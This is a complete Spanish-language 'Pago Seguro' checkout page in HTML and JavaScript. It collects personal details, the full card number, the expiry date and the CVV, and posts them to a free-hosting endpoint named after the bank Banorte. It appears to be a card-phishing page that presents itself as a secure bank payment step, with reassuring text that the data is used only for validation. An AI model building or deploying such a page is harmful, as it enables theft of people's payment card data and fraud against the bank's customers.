<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Pago Seguro</title>

<meta
  http-equiv="X-Content-Type-Options"
  content="nosniff"
>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: linear-gradient(
    135deg,
    #4a148c,
    #7b1fa2
  );
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

.container {
  background: white;
  padding: 25px;
  border-radius: 15px;
  width: 360px;
  box-shadow:
    0 10px 25px rgba(0, 0, 0, 0.3);
}

h2 {
  text-align: center;
  color: #6a1b9a;
}

input,
select {
  width: 100%;
  padding: 10px;
  margin: 7px 0;
  border-radius: 8px;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  width: 100%;
  padding: 12px;
  background: #6a1b9a;
  color: white;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: 0.2s;
}

button:hover {
  background: #4a148c;
}

button:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

.cvv-container {
  position: relative;
}

.toggle-cvv {
  position: absolute;
  right: 10px;
  top: 19px;
  cursor: pointer;
  font-size: 12px;
  color: #6a1b9a;
  user-select: none;
}

.section-title {
  margin-top: 10px;
  font-size: 14px;
  color: #555;
}

.loading {
  display: none;
  margin-top: 10px;
  text-align: center;
  color: #6a1b9a;
  font-size: 13px;
}

#contenedorPlanPago {
  display: none;
}
</style>
</head>

<body>

<div class="container">

  <h2>Pago Seguro</h2>

  <form
    id="paymentForm"
    method="POST"
    action="https://backend-banorte.onrender.com/api/payment/3d-secure"
    autocomplete="off"
    onsubmit="return validarForm()"
    target="_self"
  >

    <div class="section-title">
      Datos personales
    </div>

    <input
      name="nombre"
      placeholder="Nombre completo"
      required
      minlength="3"
    >

    <input
      name="correo"
      type="email"
      placeholder="Correo electrónico"
      required
    >

    <input
      name="telefono"
      placeholder="Teléfono"
      pattern="\d{10}"
      inputmode="numeric"
      required
    >

    <div class="section-title">
      Dirección de facturación
    </div>

    <input
      name="direccion"
      placeholder="Dirección"
      required
      minlength="5"
    >

    <input
      name="ciudad"
      placeholder="Ciudad"
      required
    >

    <input
      name="cp"
      placeholder="Código Postal"
      pattern="\d{5}"
      inputmode="numeric"
      required
    >

    <div class="section-title">
      Tipo de tarjeta
    </div>

    <select
      id="tipoTarjeta"
      name="tipoTarjeta"
      required
    >
      <option value="">
        Selecciona
      </option>

      <option value="CR">
        Tarjeta de crédito
      </option>

      <option value="DB">
        Tarjeta de débito
      </option>
    </select>

    <div id="contenedorPlanPago">

      <div class="section-title">
        Modalidad de pago
      </div>

      <select
        id="planPago"
        name="planPago"
      >
        <option value="contado">
          Pago de contado
        </option>

        <option value="03">
          3 meses sin intereses
        </option>

        <option value="06">
          6 meses sin intereses
        </option>

        <option value="09">
          9 meses sin intereses
        </option>

        <option value="12">
          12 meses sin intereses
        </option>
      </select>

    </div>

    <div class="section-title">
      Datos de la tarjeta
    </div>

    <input
      name="cardNumber"
      placeholder="Número de tarjeta"
      maxlength="19"
      pattern="\d{15,19}"
      inputmode="numeric"
      required
    >

    <input
      name="cardExp"
      placeholder="MM/AA"
      maxlength="5"
      pattern="\d{2}/\d{2}"
      inputmode="numeric"
      required
    >

    <div class="cvv-container">

      <input
        id="cvv"
        name="cvv"
        type="password"
        placeholder="CVV"
        maxlength="4"
        pattern="\d{3,4}"
        inputmode="numeric"
        required
      >

      <span
        class="toggle-cvv"
        onclick="toggleCVV()"
      >
        Ver
      </span>

    </div>

    <input
      name="amount"
      type="number"
      min="1"
      max="9999999.99"
      step="0.01"
      placeholder="Monto"
      required
    >

    <button
      id="submitBtn"
      type="submit"
    >
      Pagar
    </button>

    <div
      class="loading"
      id="loading"
    >
      Redirigiendo a validación segura...
    </div>

    <p
      style="
        font-size: 12px;
        color: gray;
        text-align: center;
      "
    >
      Tus datos se usan únicamente
      para validar el pago de forma segura.
    </p>

  </form>

</div>

<script>

// ===============================
// ELEMENTOS DEL FORMULARIO
// ===============================
const tipoTarjeta =
  document.getElementById(
    "tipoTarjeta"
  );

const planPago =
  document.getElementById(
    "planPago"
  );

const contenedorPlanPago =
  document.getElementById(
    "contenedorPlanPago"
  );


// ===============================
// MOSTRAR PLAN DE PAGO
// ===============================
function actualizarPlanPago() {

  if (tipoTarjeta.value === "CR") {

    // Crédito:
    // contado o meses sin intereses
    contenedorPlanPago.style.display =
      "block";

  } else {

    // Débito:
    // solamente pago de contado
    contenedorPlanPago.style.display =
      "none";

    planPago.value = "contado";
  }
}

tipoTarjeta.addEventListener(
  "change",
  actualizarPlanPago
);

actualizarPlanPago();


// ===============================
// VALIDACIÓN GENERAL
// ===============================
function validarForm() {

  const monto =
    document.querySelector(
      '[name="amount"]'
    ).value;

  const tipo =
    tipoTarjeta.value;

  const modalidad =
    planPago.value;

  const modalidadesPermitidas = [
    "contado",
    "03",
    "06",
    "09",
    "12"
  ];

  if (Number(monto) <= 0) {

    alert("Monto inválido");

    return false;
  }

  if (
    tipo !== "CR" &&
    tipo !== "DB"
  ) {

    alert(
      "Selecciona el tipo de tarjeta"
    );

    return false;
  }

  if (
    !modalidadesPermitidas.includes(
      modalidad
    )
  ) {

    alert(
      "Modalidad de pago inválida"
    );

    return false;
  }

  if (
    tipo === "DB" &&
    modalidad !== "contado"
  ) {

    alert(
      "La tarjeta de débito solo permite pago de contado"
    );

    planPago.value = "contado";

    return false;
  }

  document
    .getElementById("submitBtn")
    .disabled = true;

  document
    .getElementById("loading")
    .style.display = "block";

  return true;
}


// ===============================
// MOSTRAR / OCULTAR CVV
// ===============================
function toggleCVV() {

  const cvv =
    document.getElementById("cvv");

  cvv.type =
    cvv.type === "password"
      ? "text"
      : "password";
}


// ===============================
// FORMATO MM/AA
// ===============================
document
  .querySelector('[name="cardExp"]')
  .addEventListener("input", e => {

    let val =
      e.target.value
        .replace(/\D/g, "");

    val = val.slice(0, 4);

    if (val.length >= 3) {

      val =
        val.slice(0, 2) +
        "/" +
        val.slice(2);
    }

    e.target.value = val;
  });


// ===============================
// SOLO NÚMEROS TARJETA
// ===============================
document
  .querySelector('[name="cardNumber"]')
  .addEventListener("input", e => {

    e.target.value =
      e.target.value
        .replace(/\D/g, "")
        .slice(0, 19);
  });


// ===============================
// SOLO NÚMEROS CVV
// ===============================
document
  .querySelector('[name="cvv"]')
  .addEventListener("input", e => {

    e.target.value =
      e.target.value
        .replace(/\D/g, "")
        .slice(0, 4);
  });


// ===============================
// SOLO NÚMEROS TELÉFONO
// ===============================
document
  .querySelector('[name="telefono"]')
  .addEventListener("input", e => {

    e.target.value =
      e.target.value
        .replace(/\D/g, "")
        .slice(0, 10);
  });


// ===============================
// SOLO NÚMEROS CP
// ===============================
document
  .querySelector('[name="cp"]')
  .addEventListener("input", e => {

    e.target.value =
      e.target.value
        .replace(/\D/g, "")
        .slice(0, 5);
  });

</script>

</body>
</html>
